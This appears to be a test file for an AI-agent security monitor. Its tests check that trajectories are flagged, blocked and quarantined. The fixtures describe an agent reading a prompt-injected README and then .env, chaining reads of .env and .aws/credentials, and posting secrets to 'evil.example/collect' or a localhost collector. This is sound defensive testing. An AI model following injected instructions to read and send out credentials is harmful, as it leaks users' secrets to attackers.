import { describe, expect, it } from 'vitest';
import { createAgentEvent, type AgentContext } from '@veyra/agent-events';
import { createId } from '@veyra/shared';
import { PolicyEngine } from '@veyra/policy-engine';
import { SqliteVeyraStore } from '@veyra/storage';
import {
  Watchdog,
  injectionThenSecretRule,
  credentialChainRule,
  secretThenNetworkRule,
} from '../src/index.js';
import type { SemanticAnalyzer } from '../src/types.js';

function ctx(overrides: Partial<AgentContext> = {}): AgentContext {
  return {
    agentId: 'agent_1',
    sessionId: 'sess_1',
    workingDirectory: '/repo',
    environment: 'local',
    securityState: 'NORMAL',
    task: { id: 'task_auth', description: 'Fix authentication bug' },
    ...overrides,
  };
}

function evt(
  partial: Parameters<typeof createAgentEvent>[0],
): ReturnType<typeof createAgentEvent> {
  return createAgentEvent({
    sessionId: 'sess_1',
    agentId: 'agent_1',
    ...partial,
  });
}

describe('trajectory rules', () => {
  it('detects README → .env injection trajectory', () => {
    const history = [
      evt({
        id: 'e1',
        type: 'file_read',
        action: { name: 'read_file', target: 'README.md' },
      }),
      evt({
        id: 'e2',
        type: 'security_event',
        action: { name: 'prompt_injection_suspected', target: 'README.md' },
      }),
      evt({
        id: 'e3',
        type: 'file_read',
        action: { name: 'read_file', target: '.env' },
      }),
    ];

    const signal = injectionThenSecretRule.evaluate(history, ctx());
    expect(signal?.type).toBe('injection_then_secret_access');
    expect(signal?.severity).toBe('HIGH');
    expect(signal?.relatedEventIds).toContain('e3');
  });

  it('detects credential chain across stores', () => {
    const history = [
      evt({
        id: 'e1',
        type: 'file_read',
        action: { name: 'read_file', target: '.env' },
      }),
      evt({
        id: 'e2',
        type: 'file_read',
        action: { name: 'read_file', target: '.aws/credentials' },
      }),
    ];

    const signal = credentialChainRule.evaluate(history, ctx());
    expect(signal?.type).toBe('credential_access_chain');
  });

  it('detects secret then network exfil trajectory', () => {
    const history = [
      evt({
        id: 'e1',
        type: 'file_read',
        action: { name: 'read_file', target: '.env' },
      }),
      evt({
        id: 'e2',
        type: 'network',
        action: { name: 'http_post', target: 'https://evil.example/collect' },
      }),
    ];

    const signal = secretThenNetworkRule.evaluate(history, ctx());
    expect(signal?.severity).toBe('CRITICAL');
    expect(signal?.ruleId).toBe('TRAJECTORY_SECRET_THEN_NETWORK');
  });

  it('detects secret then localhost:8787 collector exfil', () => {
    const history = [
      evt({
        id: 'e1',
        type: 'file_read',
        action: { name: 'read_file', target: '.env' },
      }),
      evt({
        id: 'e2',
        type: 'network',
        action: { name: 'web_fetch', target: 'http://127.0.0.1:8787/collect' },
      }),
    ];

    const signal = secretThenNetworkRule.evaluate(history, ctx());
    expect(signal?.severity).toBe('CRITICAL');
    expect(signal?.relatedEventIds).toEqual(['e1', 'e2']);
  });

  it('does not flag benign auth.ts read alone', () => {
    const history = [
      evt({
        id: 'e1',
        type: 'file_read',
        action: { name: 'read_file', target: 'src/auth.ts' },
      }),
    ];
    expect(injectionThenSecretRule.evaluate(history, ctx())).toBeNull();
  });
});

describe('Watchdog', () => {
  it('correlates injection then secret and blocks via policy + trajectory', async () => {
    const store = SqliteVeyraStore.openMemory();
    const now = new Date().toISOString();
    const agentId = createId('agent');
    const sessionId = createId('sess');

    await store.agents.upsert({
      id: agentId,
      name: 'Test',
      runtime: 'test',
      model: null,
      createdAt: now,
      updatedAt: now,
    });
    await store.sessions.create({
      id: sessionId,
      agentId,
      taskId: 'task_auth',
      taskDescription: 'Fix authentication bug',
      workingDirectory: '/repo',
      environment: 'local',
      status: 'ACTIVE',
      securityState: 'NORMAL',
      startedAt: now,
      endedAt: null,
    });

    const watchdog = new Watchdog({ store });
    const context = ctx({ agentId, sessionId });

    await watchdog.observe(
      evt({
        id: createId('evt'),
        sessionId,
        agentId,
        type: 'file_read',
        action: { name: 'read_file', target: 'README.md' },
      }),
      context,
    );

    await watchdog.observe(
      evt({
        id: createId('evt'),
        sessionId,
        agentId,
        type: 'security_event',
        action: { name: 'prompt_injection_suspected', target: 'README.md' },
      }),
      context,
    );

    const obs = await watchdog.observe(
      evt({
        id: createId('evt'),
        sessionId,
        agentId,
        type: 'file_read',
        action: { name: 'read_file', target: '.env' },
      }),
      context,
    );

    expect(obs.blocked).toBe(true);
    expect(obs.signals.some((s) => s.type === 'injection_then_secret_access')).toBe(true);
    expect(obs.policyDecisions.some((d) => d.ruleId === 'SECRET_ACCESS')).toBe(true);
    expect(context.securityState).toBe('RESTRICTED');

    const snap = watchdog.snapshot(context);
    expect(snap.eventCount).toBe(3);
    expect(snap.signalCount).toBeGreaterThanOrEqual(1);

    store.close();
  });

  it('hydrates session history from store across Watchdog instances', async () => {
    const store = SqliteVeyraStore.openMemory();
    const now = new Date().toISOString();
    const agentId = createId('agent');
    const sessionId = createId('sess');

    await store.agents.upsert({
      id: agentId,
      name: 'Test',
      runtime: 'test',
      model: null,
      createdAt: now,
      updatedAt: now,
    });
    await store.sessions.create({
      id: sessionId,
      agentId,
      taskId: 'task_auth',
      taskDescription: 'Fix authentication bug',
      workingDirectory: '/repo',
      environment: 'local',
      status: 'ACTIVE',
      securityState: 'NORMAL',
      startedAt: now,
      endedAt: null,
    });

    const first = new Watchdog({ store, enableSemantic: false });
    const context = ctx({ agentId, sessionId });
    await first.observe(
      evt({
        id: createId('evt'),
        sessionId,
        agentId,
        type: 'file_read',
        action: { name: 'read_file', target: '.env' },
      }),
      context,
    );

    // New process boundary — empty in-memory history, must reload from SQLite.
    const second = new Watchdog({ store, enableSemantic: false });
    const obs = await second.observe(
      evt({
        id: createId('evt'),
        sessionId,
        agentId,
        type: 'network',
        action: { name: 'web_fetch', target: 'http://127.0.0.1:8787/collect' },
      }),
      context,
    );

    expect(obs.signals.some((s) => s.type === 'secret_then_network_exfil')).toBe(true);
    expect(
      obs.policyDecisions.some((d) => d.ruleId === 'TRAJECTORY_SECRET_THEN_NETWORK'),
    ).toBe(true);
    expect(context.securityState).toBe('QUARANTINED');
    store.close();
  });

  it('continues hard policies when semantic analyzer is disabled', async () => {
    const watchdog = new Watchdog({ semanticAnalyzer: null });
    const context = ctx();

    const obs = await watchdog.observe(
      evt({
        id: createId('evt'),
        type: 'file_read',
        action: { name: 'read_file', target: '.env' },
      }),
      context,
    );

    expect(obs.blocked).toBe(true);
    expect(obs.semantic).toBeNull();
    expect(obs.primaryPolicy?.ruleId).toBe('SECRET_ACCESS');
  });

  it('hard-denies further actions when session is already quarantined', async () => {
    const store = SqliteVeyraStore.openMemory();
    const now = new Date().toISOString();
    const agentId = createId('agent');
    const sessionId = createId('sess');

    await store.agents.upsert({
      id: agentId,
      name: 'Test',
      runtime: 'test',
      model: null,
      createdAt: now,
      updatedAt: now,
    });
    await store.sessions.create({
      id: sessionId,
      agentId,
      taskId: null,
      taskDescription: null,
      workingDirectory: '/repo',
      environment: 'local',
      status: 'QUARANTINED',
      securityState: 'QUARANTINED',
      startedAt: now,
      endedAt: null,
    });
    await store.securityState.set(sessionId, 'QUARANTINED', 'prior violation');

    const watchdog = new Watchdog({ store, enableSemantic: false });
    const context = ctx({ agentId, sessionId, securityState: 'QUARANTINED' });

    const obs = await watchdog.observe(
      evt({
        id: createId('evt'),
        sessionId,
        agentId,
        type: 'file_read',
        action: { name: 'read_file', target: 'README.md' },
      }),
      context,
    );

    expect(obs.blocked).toBe(true);
    expect(obs.primaryPolicy?.ruleId).toBe('SESSION_QUARANTINED');
    expect(context.securityState).toBe('QUARANTINED');

    store.close();
  });

  it('never lets semantic analysis independently grant authority or block', async () => {
    const semantic: SemanticAnalyzer = {
      async analyze() {
        return {
          eventId: 'e1',
          risk: 'CRITICAL',
          confidence: 0.99,
          category: 'injection',
          explanation: 'Semantic wants quarantine — must not be sole authority',
        };
      },
    };

    const watchdog = new Watchdog({
      semanticAnalyzer: semantic,
      policyEngine: new PolicyEngine({ policies: [] }),
      rules: [],
    });
    const context = ctx();
    const obs = await watchdog.observe(
      evt({
        id: createId('evt'),
        type: 'file_read',
        action: { name: 'read_file', target: 'README.md' },
      }),
      context,
    );

    expect(obs.semantic?.risk).toBe('CRITICAL');
    expect(obs.blocked).toBe(false);
    expect(obs.primaryPolicy).toBeNull();
    expect(context.securityState).toBe('NORMAL');
  });
});
